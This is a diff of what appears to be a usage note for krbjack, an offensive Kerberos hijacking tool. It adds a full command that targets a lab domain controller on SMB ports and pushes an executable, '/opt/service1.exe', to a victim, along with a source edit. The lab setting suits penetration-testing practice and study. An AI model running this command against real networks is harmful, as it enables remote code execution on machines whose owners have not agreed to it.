@@ -12,9 +12,12 @@ usage:
 edit the source file in the picture at line 57 and replace:
 str(uuid etc) with 'service1'
 
-'''
+
+then run
 python3 -m krbjack --target-name winattacker --domain bluelab.local --dc-ip 172.27.18.19 --ports 139,445 --executable /opt/service1.exe
-'''
+
+kaliattacker: victim
+
 
 enjoy
 
